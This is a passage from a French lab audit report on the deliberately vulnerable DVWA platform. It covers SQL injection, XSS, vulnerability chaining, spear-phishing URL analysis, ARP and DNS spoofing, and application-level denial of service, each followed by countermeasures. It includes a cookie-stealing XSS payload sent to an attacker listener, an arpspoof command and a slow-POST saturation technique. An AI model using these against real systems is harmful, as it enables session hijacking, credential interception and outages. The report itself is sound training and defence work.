  et données de cours simulées) → fuite de données personnelles des étudiants,
  non-conformité au RGPD pour un organisme de formation.
- **Intégrité** : selon les privilèges du compte SQL, modification ou
  suppression de données (`INSERT`/`UPDATE`/`DELETE`, voire `DROP TABLE`).
- **Chaînage avec l'audit des mots de passe (§ 9)** : les 5 empreintes MD5 non
  salées extraites sont cassables hors ligne à ~25,9 MH/s ; l'injection SQL +
  le stockage non salé équivalent à une **compromission totale des comptes**.

### 10.4 Recommandations (contre-mesures)

1. **Requêtes préparées** (PDO ou `mysqli` avec paramètres liés) : le code du
   niveau « impossible » de DVWA en est la démonstration —
   `WHERE user_id = ?`. C'est la seule protection structurelle.
2. **Validation des entrées** : cast entier (`(int)$id`) ou liste blanche pour
   un identifiant numérique.
3. **Moindre privilège** pour le compte SQL applicatif : lecture seule sur les
   vues nécessaires, pas de droits `DROP`/`FILE`.
4. **Messages d'erreur génériques** (pas de divulgation d'erreurs SQL) et
   journalisation des requêtes anormales (couche Détection, § 5).
5. **Migration du stockage des mots de passe** vers un hachage salé lent
   (§ 9.2) : le dump n'aurait alors livré que des empreintes inexploitables.

Consignation au registre :
`OBS-003;injection SQL module sqli (CWE-89);critique;Pentester;ouvert`

---

## 11. Cross-Site Scripting — audit des modules XSS (Exercice 07, 29/10/2026)

### 11.1 Démarche

Campagne de test XSS complète sur DVWA (10.40.0.10), depuis le poste
attaquant (10.40.0.20) via `docker exec` + `curl`, en niveau de sécurité
Low (cookie `security=low` du fichier de session `/tmp/ck`). Les trois
familles ont été ciblées — réfléchie (`xss_r`), stockée (`xss_s`),
DOM-based (`xss_d`) — puis l'exploitation a été poussée jusqu'au vol de
cookie de session, et une contre-mesure CSP démontrée (bonus). Constat
consigné sous la référence OBS-004 dans le registre `cves.csv`.

### 11.2 Constats et preuves par famille

**XSS réfléchie (`xss_r`, paramètre `name`).** La charge
`<script>alert(1)</script>` envoyée dans l'URL est renvoyée **sans aucun
échappement** dans le HTML de réponse
(`<pre>Hello <script>alert(1)</script></pre>`), alors qu'une entrée
inoffensive (`Audit`) ressort telle quelle : l'entrée utilisateur est
recopiée telle quelle dans la sortie (CWE-79). Le vecteur est l'URL
elle-même : un lien piégé envoyé à une victime authentifiée suffit,
sans autre interaction que le clic.

**XSS stockée (`xss_s`, champs `txtName`/`mtxMessage`).** Le message
piégé (même charge) est enregistré en base et **rejoué intact à chaque
consultation** — vérifié par rechargements successifs, y compris pour un
visiteur quelconque de la page. Constat annexe : le formulaire du
guestbook n'embarque **aucun jeton anti-CSRF** (`grep -c user_token`
renvoie 0, contre un jeton présent sur le formulaire de connexion) ; le
module cumule donc XSS stockée et CSRF.

**XSS DOM-based (`xss_d`, paramètre `default`).** La charge placée dans
l'URL **n'apparaît nulle part dans le HTML renvoyé par le serveur**
(grep = 0) : c'est le JavaScript de la page qui, dans le navigateur, lit
le fragment d'URL et l'injecte dans le DOM
(`document.write("<option value='" + lang + "'>" + decodeURI(lang) +
"</option>")`. Le serveur ne voit jamais l'attaque : l'absence de
réflexion dans la réponse HTTP n'est donc **pas** une preuve
d'innocuité — faux négatif symétrique de celui de l'outil documenté
au § 10.

**Vol de cookie de session (exploitation).** L'en-tête `Set-Cookie` du
serveur (`PHPSESSID=...; path=/`) est dépourvu de l'attribut
**`HttpOnly`** : le cookie est donc lisible par `document.cookie`. La
charge `new Image().src='http://10.40.0.20:8000/?c='+document.cookie`
injectée dans `xss_r` ressort intacte (elle s'exécuterait dans le
navigateur de la victime), et la requête correspondante a été reçue et
journalisée par un serveur d'écoute contrôlé par l'attaquant :

```text
"GET /?c=PHPSESSID=...;security=low HTTP/1.1" 200 -
```

Le détournement de session (hijacking) ne nécessite ainsi ni mot de
passe ni login : le cookie volé suffit à usurper l'identité de la
victime.

*(Captures : `captures/xss-etape1-authentification-session.png`,
`captures/xss-etape2-security-low.png`,
`captures/xss-etape3-xss-reflechie-charge.png`,
`captures/xss-etape3-xss-reflechie-comparaison.png`,
`captures/xss-etape4-xss-stockee-injection.png`,
`captures/xss-etape4-xss-stockee-persistance.png`,
`captures/xss-etape5-xss-dom-preuves.png`,
`captures/xss-etape6-cookie-sans-httponly.png`,
`captures/xss-etape6-vol-cookie.png`.)*

### 11.3 Bonus — démonstration de la contre-mesure CSP

Un serveur de démonstration (Python, `csp-demo/server.py`, sans
installation) sert la même page simulée `xss_r`, avec ou sans l'en-tête
`Content-Security-Policy: script-src 'self'` :

- **sans CSP** : l'alerte s'exécute dans le navigateur — la charge est
  pleinement opérationnelle ;
- **avec CSP** : le navigateur refuse le script inline
  (« Refused to execute inline script because it violates the
  following Content Security Policy directive ») et refuse également
  le chargement d'un script hébergé sur un domaine tiers ;
- **la nuance** : une CSP restrictive bloque les scripts **inline**
  (ce que la XSS injecte) **et** les scripts externes non autorisés ;
  l'assouplir avec `'unsafe-inline'` rouvrirait exactement la faille
  qu'elle ferme (les variantes hash/nonce sont les seules autorisations
  ciblées possibles).

*(Captures : `captures/xss-bonus-csp-en-tete.png`,
`captures/xss-bonus-csp-sans-csp-execution.png`,
`captures/xss-bonus-csp-avec-csp-bloquee.png`,
`captures/xss-bonus-csp-externe-bloque.png`.)*

### 11.4 Contre-mesures recommandées

1. **Échappement des sorties selon le contexte** (défense de base) :
   encoder chaque donnée réfléchie ou stockée selon le contexte de
   sortie (corps HTML, attribut, JavaScript, URL — `htmlspecialchars()`
   et encodeurs dédiés) ; côté DOM, utiliser des API sûres
   (`textContent`) au lieu de `innerHTML`/`document.write` sur des
   données non maîtrisées.
2. **Attribut `HttpOnly`** sur tous les cookies de session : le
   JavaScript ne peut plus les lire, le vol démontré devient
   impossible.
3. **Content Security Policy restrictive** (`script-src 'self'`, sans
   `unsafe-inline`) diffusée par en-tête HTTP : bloque l'exécution des
   charges injectées même en cas d'échappement manqué — défense en
   profondeur, complément indispensable mais jamais substituable à
   l'échappement (défense de base).
4. **Jetons anti-CSRF systématiques** sur tous les formulaires POST
   (cf. constat du guestbook, § 11.2).
5. **Validation des entrées** par listes blanches en complément (le
   module `xss_d` valide déjà que `default` n'est pas un tableau : à
   généraliser à toutes les entrées).

--- 

## 12. Chaînage des vulnérabilités — l'effet domino (chapitre « Chaîner les vulnérabilités », 29/10/2026)

Les sections précédentes ont évalué chaque faille isolément. Ce chapitre les
combine : une vulnérabilité devient la marche d'entrée de la suivante, et
l'impact final dépasse la somme des failles prises une à une. Chaque maillon
ci-dessous reprend un résultat **déjà prouvé** dans ce rapport.

### 12.1 Chaîne 1 — XSS → vol de session → prise du compte administrateur

1. **Entrée** : XSS réfléchie sans échappement (§ 11.2) — la charge injectée
   s'exécute dans le navigateur de la victime.
2. **Escalade** : le cookie `PHPSESSID` est dépourvu d'attribut `HttpOnly`
   (§ 11.2) : `document.cookie` le lit, et le vol **a été démontré** (requête
   reçue et journalisée par le serveur contrôlé par l'attaquant).
3. **Impact** : le cookie volé suffit à usurper la session — **sans mot de
   passe ni login**. La session ciblée dans la démonstration étant
   administrateur, l'attaquant hérite de ses droits.

### 12.2 Chaîne 2 — Injection SQL → fuite d'empreintes → cassage hors ligne → compromission des comptes

1. **Entrée** : injection SQL (§ 10.2) — `GET parameter 'id' is vulnerable`,
   extraction UNION de la table `users`.
2. **Escalade** : 5 comptes extraits, mots de passe en **MD5 non salé**
   (§ 10.2).
3. **Impact** : les empreintes sont cassables hors ligne à ~25,9 MH/s
   (mesure de § 9) — un mot de passe de dictionnaire tombe instantanément
   (`codemax123` retrouvé avec un dictionnaire de 6 mots). Détail aggravant
   relevé dans le dump : `admin` et `smithy` partagent la même empreinte —
   deux comptes au même mot de passe, donc réutilisation probable
   d'identifiants.

La faille applicative (§ 10) combinée au stockage non salé (§ 9) équivaut à
une **compromission totale des comptes** — bien au-delà de ce que chaque
faille permettait séparément.

### 12.3 Chaîne 3 — Réseau en clair → interception → identifiants

Le trafic HTTP n'est pas chiffré (constat § 7.6). Un attaquant positionné en
MITM par empoisonnement ARP puis détournement DNS (§ 14) fait résoudre le
domaine légitime vers son IP et **lit les identifiants en clair** (requête
authentifiée capturée, § 14) : la victime s'authentifie « normalement » sur
le portail usurpé. Le chapitre phishing (§ 13) atteint le même but côté
humain : le courriel ciblé amène le formateur à saisir ses identifiants sur
le domaine usurpé. Deux vecteurs, un seul maillon commun : **des
identifiants transitent en clair** — la réponse (TLS + HSTS, vérification
du domaine) est la même.

### 12.4 Ce que le chaînage change pour la défense en profondeur
   Chaîne | Maillon faible | Contre-mesure qui casse la chaîne | Couche (§ 5) |
 |---|---|---|---|
 | XSS → vol de session | absence de `HttpOnly` | échappement des sorties + `HttpOnly` + CSP | Application |
 | SQLi → cassage des comptes | MD5 non salé | requêtes préparées + hachage salé lent (Argon2id/bcrypt) | Application / Données |
 | MITM → identifiants en clair | HTTP sans TLS | TLS obligatoire + HSTS + protections ARP/DNS | Réseau |

Lecture : chaque chaîne est interrompue **dès son premier maillon corrigé** —
justification concrète de la défense en profondeur (§ 5) : corriger une
couche protège aussi les autres. À l'inverse, un correctif isolé (fermer la
XSS mais laisser le MD5 non salé) laisse la chaîne 2 entière : le plan
d'action du rapport final découpe les **chaînes**, pas seulement les failles.

---   

## 13. Phishing et ingénierie sociale — analyse d'une campagne ciblée (Exercice 08, 29/10/2026)

### 13.1 Démarche et support d'analyse

Contrairement aux chapitres précédents, aucune vulnérabilité technique de
la plateforme n'est exploitée ici : ce chapitre cartographie la **surface
d'attaque humaine**. Un courriel de spear phishing simulé ciblant un
formateur de Code un max a été forgé (`courriel-suspect.txt`), déposé
dans le conteneur attaquant (`docker cp`), puis analysé avec les outils
du lab (`grep` pour l'extraction des URL, `idn` pour le décodage
Punycode). Les constats alimentent les recommandations de sensibilisation.

### 13.2 Marqueurs de spear phishing relevés (étape 2)

1. **Ciblage par fonction** : le message s'adresse à un rôle précis de
   l'organisation (« votre compte formateur », « vos évaluations et les
   notes de vos élèves »), pas à un destinataire générique.
2. **Usurpation d'autorité interne** : l'expéditeur affiché imite le
   « Service Informatique - Code un max », l'adresse réelle étant un
   domaine tiers (verif-compte.net) ; une référence de dossier
   (CUM-2026-4512) renforce la crédibilité.
3. **Urgence et menace** : « l'accès au portail sera suspendu sous 24
   heures si votre identité n'est pas confirmée » — pression temporelle
   qui court-circuite la vérification.
4. **Détails plausibles** : heure précise (06h42), origine géographique
   de la connexion suspecte (Belgique) — faux mais concrets.

**Justification** : ces marqueurs lèvent successivement les trois
réflexes de méfiance — l'identification (le destinataire se reconnaît),
la légitimité (l'autorité imitée) et le temps de vérification (l'urgence).
Un phishing de masse (« Cher client ») est filtré mentalement en
quelques secondes ; le spear phishing, personnalisé, atteint des taux de
clic nettement supérieurs — c'est la différence entre une diffusion
anonyme et une attaque dirigée.

### 13.3 Classification des URL extraites (étape 3)

Extraction par `grep -oE "https?://[^ ]+"` ; règle de lecture : le
domaine réellement contacté est le dernier label avant le premier `/`
après un éventuel `@` — tout ce qui précède un `@` est du *userinfo*
ignoré par le navigateur, et un sous-domaine n'est pas le domaine.

| URL du courriel | Technique de leurre | Domaine réellement contacté |
|---|---|---|
| `https://code-un-max.fr.session-login.ru/connexion` | sous-domaine trompeur | **session-login.ru** |
| `https://code-un-max.fr@phishing-serveur.net/connexion` | arobase masquant la destination | **phishing-serveur.net** |
| `https://xn--code-un-mx-8bb.fr/connexion` | Punycode / homographie | **code-unõ-mx.fr** |
| `https://code-un-nax.fr/connexion` | faute de frappe (typosquatting, `m`→`n`) | **code-un-nax.fr** |

### 13.4 Décodage de l'homographe (étape 4)

`xn--code-un-mx-8bb.fr` décodé (idn, locale UTF-8) s'affiche
**`code-unõ-mx.fr`** : le caractère « õ » imite la séquence « -a » du
domaine légitime `code-un-max.fr`. À l'écran, la confusion est quasi
immédiate — c'est l'attaque par homographie. Détail relevé au passage :
le validateur de registre intégré à `idn` **rejette lui-même** le
caractère (`tld_check_4z: Code points prohibited by top-level domain`),
ce qui illustre le niveau de finesse de la supercherie. (Note technique :
le décodage exige une locale UTF-8 dans le conteneur, sous peine d'un
échec de conversion ASCII silencieux.)

### 13.5 Menace intérieure (étape 5)

**Scénario — insider accidentel.** Un formateur pressé clique sur le
lien piégé, saisit ses identifiants sur la fausse page (aucune
vérification du survol), puis ne signale rien — par peur d'être blâmé.
L'attaquant récupère la session, rebondit sur le carnet d'adresses du
compte et propage la campagne en interne avec une crédibilité accrue
(« ça vient d'un collègue »).

*Signaux faibles de détection* : connexions au portail depuis des
heures/lieux inhabituels, échecs de connexion répétés puis succès,
modifications de paramètres non demandées, signalements informels
(« j'ai reçu un courriel bizarre ») jamais formalisés.

**Scénario — insider malveillant.** Un employé avec accès aux listes de
formateurs et à la charte graphique les transmet sciemment à l'attaquant,
lui permettant de personnaliser la campagne — complicité directe, sans
laquelle le degré de ciblage observé serait difficile à atteindre.

*Signaux faibles de détection* : consultations d'annuaires RH hors
périmètre fonctionnel, exports de listes en dehors des périodes légitimes,
contournement répété des procédures (poste non conforme, outils non
autorisés), connexions à des heures inhabituelles (analyse
comportementale).

### 13.6 Recommandations (étape 6)

**Mesures techniques :**

1. **Filtrage en entrée** : SPF, DKIM et DMARC pour authentifier les
   expéditeurs, passerelle de messagerie analysant liens et pièces
   jointes avant la boîte de réception.
2. **Point d'entrée unique** : accès au portail uniquement par favori
   interne ou SSO, jamais depuis un lien reçu par courriel.
3. **Blocage des domaines homographes** : filtrage des variantes
   Punycode/typosquatting du domaine légitime au proxy/DNS, et affichage
   du domaine réel (et non du seul nom convivial) dans les clients de
   messagerie.

**Mesures humaines (sensibilisation) :**

4. **Vérification du survol** : avant tout clic, contrôler le domaine
   réel de destination (présence d'un `@`, de `xn--`, d'un sous-domaine
   trompeur) — geste enseigné et répété par des simulations de phishing
   régulières avec retour individualisé.
5. **Culture du signalement sans blâme** : toute personne suspectant un
   courriel le signale en une action ; le signalement rapide est
   valorisé, jamais puni (le scénario accidentel du § 13.5 naît précisé-
   ment de la peur du blâme).
6. **Double validation** pour toute action sensible (changement d'iden-
   tifiants, demande de paiement) : confirmation par un second canal.

### 13.7 Bonus — procédure de signalement d'un courriel suspect

1. **Employé** : ne pas cliquer, ne pas répondre, ne pas transférer en
   interne ; signaler via le bouton dédié du client de messagerie (à
   défaut, transférer en pièce jointe `.eml` à l'adresse de sécurité
   afin de préserver les en-têtes), puis supprimer le message après
   accusé de réception.
2. **Analyste** : accuser réception ; extraire les IoC (expéditeur réel,
   domaines contactés, URL complètes, pièces jointes et leurs hachés) ;
   les rechercher dans les journaux (proxy, SIEM, passerelle) pour
   savoir si d'autres destinataires l'ont reçu et si quelqu'un a déjà
   visité le lien ; bloquer (proxy, messagerie) ; en cas de compro-
   mission confirmée : invalider les sessions et mots de passe, étendre
   l'investigation, alerter les équipes concernées.
3. **Boucle de retour** : informer le déclarant de la suite donnée,
   enrichir la base d'IoC, suivre le taux de signalement comme indicateur
   de maturité humaine.

*(Captures : `captures/phish-etape1-courriel-copie.png`,
`captures/phish-etape3-extraction-urls.png`,
`captures/phish-etape4-decodage-punycode.png`.)*

## 14. Attaques réseau — MITM, ARP spoofing et DNS spoofing (Exercice 09, 30/10/2026)

### 14.1 Démarche

Chapitre réseau du fil rouge : les attaques sont cette fois **locales**, à
l'intérieur du segment du lab. L'enchaînement démontré : positionnement en
homme du milieu par empoisonnement du cache ARP de la cible (usurpation de
la passerelle), détournement de la résolution DNS d'un nom de la
plateforme vers l'attaquant, interception et lecture en clair d'une
requête HTTP authentifiée, puis — en miroir — l'échec de la même
interception sur un flux chiffré (bonus). Constat consigné sous la
référence OBS-006.

Leçon d'exploitation relevée au passage : une attaque en chaîne est
fragile par nature — chaque maillon (résolveur de la victime, cache ARP,
processus d'attaque) doit être vérifié **vivant** avant de conclure, car
une panne de maillon échoue **en silence** (les requêtes semblent partir
alors qu'aucun paquet ne quitte la victime).

### 14.2 Empoisonnement ARP : positionnement en homme du milieu (étape 2)

Le cache de la cible est d'abord **amorcé** par un ping vers la
passerelle (Linux ignore les réponses ARP non sollicitées : sans entrée
préalable, l'empoisonnement ne prend pas). L'attaque annonce ensuite à
la cible que la passerelle (10.40.0.1) se trouve à la MAC de l'attaquant :

```text
arpspoof -i eth0 -t 10.40.0.10 10.40.0.1
```

Preuve relevée dans le cache de la cible (`/proc/net/arp` — l'image DVWA
ne peut plus installer `net-tools`, dépôts expirés) :

```text
10.40.0.1    0x1    0x2    fe:ba:13:29:16:d8    *    eth0
```

L'IP de la passerelle est associée à la MAC de l'attaquant : tout le
trafic sortant de la cible transite désormais par le poste offensif, qui
le relaie (`ip_forward = 1`) — la cible ne perd pas la connectivité et
ne détecte rien.

*(Capture : `captures/mitm-etape2-cache-arp-cible-empoisonne.png`.)*

### 14.3 Détournement de la résolution DNS (étape 3)

Le résolveur de la cible est dirigé au-delà de la passerelle (8.8.8.8)
pour que ses requêtes transitent par l'attaquant — le DNS intégré de
Docker (127.0.0.11) serait resté interne et invisible. Le fichier
d'association `10.40.0.20 portail.code-un-max.fr` alimente dnsspoof, qui
répond aux requêtes portant ce nom :

Preuve (depuis la cible) :

```text
PING portail.code-un-max.fr (10.40.0.20) ...
```

Le nom piégé résout vers **l'IP de l'attaquant**. Contraste : un nom
hors du fichier (`example.com`) résout normalement — le détournement
est **chirurgical**, les autres résolutions ne sont pas perturbées, ce
qui le rend discret.

*(Captures : `captures/mitm-etape3-dnsspoof-actif.png`,
`captures/mitm-etape3-resolution-detournee.png`.)*

### 14.4 Interception en clair d'une requête authentifiée (étape 4)

La capture tshark démarre **avant** la requête (règle d'or de l'analyse
réseau), un serveur factice écoute sur le port 80 de l'attaquant, et la
cible émet une requête POST authentifiée vers le nom piégé. Extrait de
la capture :

```text
10.40.0.10  10.40.0.20  portail.code-un-max.fr  /connexion
http.file_data : username=admin&password=password
```

L'intermédiaire lit **tout** : l'hôte contacté, l'URL, et les
**identifiants en clair** dans le corps de la requête — le journal du
faux portail contient la requête POST complète. La chaîne complète est
démontrée : positionnement MITM → fausse résolution → vol de données
d'authentification, sans que la cible ne perçoive quoi que ce soit.

*(Capture : `captures/mitm-etape4-requete-clair.png`.)*

### 14.5 Bonus — le même flux en HTTPS : l'interception échoue

La même requête a été rejouée en HTTPS vers un serveur TLS factice de
l'attaquant (openssl s_server, port 443). La connexion est bien établie
(négociation acceptée par le serveur), mais côté intercepteur la
capture ne remonte **aucune requête HTTP exploitable** : ni hôte, ni
URL, ni identifiants. Seule reste visible la négociation TLS (Client
Hello), dont le champ SNI révèle le nom du serveur contacté —
l'essentielle fuite de métadonnée du flux chiffré, atténuée par ECH
(Encrypted Client Hello). Contrepoint exact du § 14.4 : la position
d'homme du milieu ne disparaît pas, mais elle ne sert plus à rien.

### 14.6 Protections — chaque mesure contre son attaque (étape 5)

| Attaque démontrée | Protection | Effet |
|---|---|---|
| Lecture du trafic en clair (§ 14.4) | **TLS / HTTPS** | Le MITM voit passer les paquets mais ne peut rien lire : le chiffrement rend la position d'intermédiaire inutile. Sans clé privée du serveur, le flux reste opaque. |
| Leurre vers du HTTP non chiffré (downgrade) | **HSTS** (en-tête `Strict-Transport-Security`) | Le navigateur refuse toute connexion HTTP vers le domaine, supprimant la fenêtre de tir du downgrade — y compris si l'utilisateur clique un lien `http://`. |
| Réponse DNS forgée (§ 14.3) | **DNSSEC** | Les réponses légitimes sont signées cryptographiquement ; une réponse forgée (dnsspoof) échoue à la validation du résolveur : la cible refuse la fausse adresse. |
| Empoisonnement ARP (§ 14.2) | **DAI / arpwatch** (complément détection) | Dynamic ARP Inspection sur les commutateurs et supervision des tables ARP détectent ou bloquent les annonces falsifiées ; TLS reste la protection de fond : même positionné, l'attaquant ne lit plus rien. |

Aucune de ces protections n'est substituable à une autre : TLS protège
le contenu, HSTS verroule l'accès au canal chiffré, DNSSEC protège la
résolution — la défense en profondeur s'applique couche par couche,
exactement comme les attaques s'enchaînent couche par couche.

*(Captures du chapitre : `captures/mitm-etape2-cache-arp-cible-empoisonne.png`,
`captures/mitm-etape3-dnsspoof-actif.png`,
`captures/mitm-etape3-resolution-detournee.png`,
`captures/mitm-etape4-requete-clair.png`.)*

## 15. Déni de service applicatif — résistance de la plateforme (Exercice 10, 30/10/2026)

### 15.1 Démarche

Le fil rouge aborde la **disponibilité**, troisième pilier de la CIA
(intégrité et confidentialité étant couvertes par les chapitres
précédents). Trois mesures successives : référence à vide, saturation
applicative contrôlée, puis remesure sous charge avec une garde serveur
activée. Constat consigné sous la référence OBS-007.

### 15.2 Référence de disponibilité (étape 1)

Trois mesures successives sur `login.php` (la racine `/` renvoie un 302
qui fausserait la lecture du code) :

```text
code=200 temps=0.010   code=200 temps=0.011   code=200 temps=0.010
```

Référence retenue : **200 en ~0,01 s** — trois mesures cohérentes, la
répétition neutralisant l'effet de cache du premier appel.

### 15.3 Saturation applicative (étapes 2 et 3)

Enseignement préalable de ce chapitre : le **débit de requêtes** n'atteint
pas ce serveur (page légère ~10 ms, capacité de plusieurs milliers de
requêtes/seconde — un flot de quelques centaines de requêtes est absorbé
sans dégradation mesurable). La charge qui mord est celle qui **capte
les workers** : le script déployé (`/data/charge.sh`) ouvre des vagues de
**200 connexions simultanées**, chacune annonçant un corps de requête
(`Content-Length: 1000`) qui n'arrive jamais — chaque connexion retient
un worker Apache (150 disponibles) en attente d'un corps fantôme.

Preuves relevées :

```text
connexions établies vers la cible : 200
témoin sous charge : code=200 temps=3.13   (×500 la référence)
témoin hors charge : code=200 temps=0.007  (récupération immédiate)
```

La disponibilité s'effondre sous une attaque qui ne représente qu'un
débit réseau négligeable : quelques centaines d'octets par connexion
suffisent à paralyser la plateforme.

Capture complémentaire pendant la charge (bonus) : le décompte des SYN
dans la capture (`/tmp/ddos.pcap`) donne **172 connexions TCP ouvertes**
vers la cible et **1 496 paquets en 5,07 s** (~294 paquets/s, taille
moyenne 338 octets) — soit environ **0,5 Mo échangés, ~100 Ko/s**. La
plateforme tombe sous un débit dérisoire : c'est la signature d'une
attaque **applicative** (peu de volume, effet maximal, à mitiger côté
serveur/WAF), à distinguer d'une attaque **volumétrique** qui, elle,
doit saturer des gigabits de bande passante (à absorber chez
l'opérateur ou le CDN).

### 15.4 Mitigation par limitation de débit (étape 4)

Le module `mod_ratelimit` visé par l'énoncé n'existe que dans Apache
≥ 2.4.48 : l'image de la cible (Apache 2.4.25, Debian — dépôts expirés,
aucune installation possible) ne l'embarque pas. La limitation de débit
**réellement disponible** sur cette version est `mod_reqtimeout`
resserré par un fragment de configuration (`/etc/apache2/conf-enabled/
limite-debit.conf`) :

```text
RequestReadTimeout header=5 body=2
```

Toute requête dont les en-têtes ou le corps ne sont pas intégralement
reçus en 5/2 secondes est coupée et son worker libéré. Le module est
vérifié actif (`reqtimeout_module (shared)` dans `apachectl -M`), le
fragment est dans la configuration active, et le rechargement s'est
fait sans coupure (`apachectl -k graceful`).

### 15.5 Remesure sous charge — le résultat honnête (étape 5)

```text
témoin sous charge avec mitigation : code=200 temps=4.56, puis 4.01
témoin hors charge                  : code=200 temps=0.007
```

Mesure au niveau d'une connexion unique, pendant une charge résiduelle :
un POST au corps retenu est rendu en **5,01 s** (`code=200`) — ~3 s de
file d'attente puis **coupe de la lecture du corps à ~2 s par la garde**
(`body=2`). L'effet **par requête** est donc bien réel : la connexion
captive est libérée au bout de 2 s au lieu des 8 s de la fenêtre client.

**La garde n'améliore pas la disponibilité globale sous cette charge.**
L'analyse de mesure l'explique : la limite resserrée divise bien par
quatre la durée de captivité de chaque connexion (8 s → 2 s), mais
l'attaque relance ses vagues en continu — chaque worker libéré est
aussitôt repris, la sur-souscription (200 connexions offertes contre
150 workers) reste permanente, et le témoin reste en file d'attente.
Une limite **par requête** ne peut pas compenser une sur-souscription
**soutenue** — exactement l'avertissement de l'énoncé : une seule
limitation côté serveur ne suffit pas contre un déni de service réellement
distribué. La mesure le démontre au lieu de le supposer : c'est le
résultat le plus utile de ce chapitre.

### 15.6 Recommandations

1. **Garde anti-lenteur conservée** : `mod_reqtimeout` actif avec des
   délais courts — elle neutralise la famille « requêtes lentes »
   (démontré au chapitre précédent : la cible répond 200 sous slowloris
   avec la garde, 000 sans elle), même si la charge soutenue la dépasse.
2. **Limitation par source** : plafonner les connexions simultanées par
   IP (mod_evasive, limitipconn ou WAF) — indisponible sur cette image
   EOL, donc à porter par un **reverse proxy / WAF en amont** de la
   plateforme.
3. **Absorption amont** : CDN / service anti-DDoS devant la plateforme —
   aucun serveur unique n'absorbe un déni de service distribué ; il
   faut l'éteindre avant l'origine.
4. **Dimensionnement et supervision** : surveiller le temps de réponse
   et la file d'attente des workers (requête témoin automatisée,
   alerte sur dérive) pour détecter l'épuisement dès les premières
   secondes.

*(Captures : `captures/ddos-etape1-baseline.png` (référence),
`captures/ddos-etape2-script-charge.png` (premier script, itération),
`captures/ddos-etape2-script-charge-final.png` (script livrable,
POST au corps retenu),
`captures/ddos-etape3-debit-absorbe.png` (flot absorbé sans captivité),
`captures/ddos-etape3-degradation.png` (connexions captives, témoin ×500),
`captures/ddos-etape4-mitigation-active.png` (garde active),
`captures/ddos-etape5-temoins-mitiges.png` (trois mesures mitigées),
`captures/ddos-etape5-connexion-unique.png` (coupe de la garde à ~2 s),
`captures/ddos-bonus-capture-connexions.png` (172 connexions, capinfos).)*

## 16. Conclusion et suites de l'audit

**Ce qui est établi à ce stade :**

- Le lab d'audit est reproductible (`docker-compose.yml`), isolé
  (`cyberlab-net`, publication locale uniquement) et opérationnel : deux
  conteneurs `Up`, ping à 0 % de perte, HTTP 302, base DVWA initialisée.
- La surface d'attaque de la cible est réduite (un seul port TCP ouvert) mais
  réelle : Apache 2.4.25 obsolète, application PHP/DVWA v1.10 en niveau Low,
  trafic non chiffré.
- L'organisation de l'audit est en place : six rôles identifiés, défense en
  profondeur décrite sur cinq couches, circuit d'incident Red/Blue tracé,
  registre `cves.csv` initialisé (OBS-001).
- La reconnaissance est documentée et prouvée (`capture-recon.pcap`), avec un
  fingerprinting validé par deux sources concordantes.
- La chaîne d'infection d'un ransomware simulé a été reconstituée sans risque :
  IoC relevés (empreinte SHA-256, extension, note de rançon, contact, URL
  capturée), kill chain documentée et recommandations prévention/réponse
  émises (§ 8).
- L'audit des mots de passe a mesuré l'écart réel entre stockage non salé
  (25,9 MH/s) et stockage salé (200 c/s, ratio ≈ 129 000), et démontré
  l'explosion combinatoire de la longueur (ETA ≈ 3 ans pour 8 caractères) :
  défenses formalisées (§ 9).
- Le module SQL Injection a été audité aux trois niveaux : injection confirmée
  et extraction complète en Low (5 comptes, MD5 non salé, deux comptes à
  empreinte identique), faille toujours exploitable en Medium (formulaire
  POST, échappement contourné par des payloads sans guillemets), point
  d'entrée bloqué en High — avec au passage un faux négatif d'outil
  documenté (sqlmap en GET face à un formulaire POST) (§ 10).
- Les modules XSS ont été audités dans leurs trois familles (réfléchie,
  stockée, DOM-based), toutes confirmées en Low : vol de cookie de
  session démontré (PHPSESSID sans `HttpOnly`), absence de jeton
  anti-CSRF sur le guestbook, et une démonstration CSP (bonus) valide la
  contre-mesure d'exécution (§ 11).
- Les vulnérabilités se chaînent : XSS → vol de session administrateur
  (cookie sans `HttpOnly`), injection SQL → empreintes MD5 cassables hors
  ligne, réseau en clair → identifiants interceptés — l'effet domino dépasse
  la somme des failles isolées (§ 12).
- Une campagne de spear phishing ciblée a été analysée sur pièce :
  marqueurs de personnalisation relevés, quatre URL empoisonnées
  classées (sous-domaine trompeur, arobase, homographie Punycode,
  typosquatting), scénarios de menace intérieure et recommandations
  de sensibilisation classées technique/humain (§ 13).
- Les attaques réseau locales ont été enchaînées : positionnement MITM
  par empoisonnement ARP de la passerelle auprès de la cible,
  détournement DNS d'un nom de la plateforme vers l'attaquant, lecture
  en clair d'une requête authentifiée — et l'échec de la même
  interception sur un flux TLS (bonus), qui appelle les protections
  TLS/HSTS/DNSSEC (§ 14).
- La résistance au déni de service applicatif a été mesurée de bout en
  bout : référence ~0,01 s, saturation par 200 connexions captives
  (témoin ×500), garde `mod_reqtimeout` resserrée — efficace par
  connexion mais pas contre la sur-souscription soutenue, d'où des
  recommandations multicouches (§ 15).

**Recommandations préliminaires :**

1. Mettre à jour la pile serveur (Apache 2.4.25 n'est plus maintenue).
2. Servir l'application en HTTPS (le trafic capturé est en clair).
3. Activer les contrôles applicatifs de DVWA (niveau High) comme contre-mesure
   de référence pour chaque faille qui sera exploitée dans les chapitres
   suivants.
4. Alimenter le registre `cves.csv` au fil des constats, avec gravité, rôle de
   traitement et statut.
5. Mettre en place des sauvegardes isolées, hors ligne et testées (règle 3-2-1),
   contre-mesure n°1 d'un rançongiciel (cf. § 8.3).
6. Migrer le stockage des mots de passe vers un hachage salé lent (Argon2id /
   bcrypt) et imposer une longueur minimale (cf. § 9).
7. Migrer toutes les requêtes SQL vers des requêtes préparées avec validation
   des entrées et compte applicatif à moindre privilège (cf. § 10.4).
8. Déployer les défenses XSS : échappement des sorties selon le contexte,
   attribut `HttpOnly` sur les cookies de session, CSP restrictive
   (`script-src 'self'`) et jetons anti-CSRF sur tous les formulaires
   (cf. § 11.4).
9. Défendre la surface humaine : authentification des expéditeurs
   (SPF/DKIM/DMARC), filtrage des domaines homographes, sensibilisation
   au survol des liens, double validation des actions sensibles et
   culture du signalement sans blâme (cf. § 13.6).
10. Chiffrer et authentifier les flux : HTTPS exclusif sur la
    plateforme, en-tête HSTS, DNSSEC sur la zone, et détection de
    l'empoisonnement ARP (DAI / arpwatch) côté commutateurs
    (cf. § 14.6).
11. Défendre la disponibilité : garder `mod_reqtimeout` actif, plafonner
    les connexions par IP via un WAF / reverse proxy en amont, s'appuyer
    sur un CDN / anti-DDoS et superviser les temps de réponse par une
    requête témoin automatisée (cf. § 15.6).

**Suite du fil rouge :** exploitation module par module des vulnérabilités
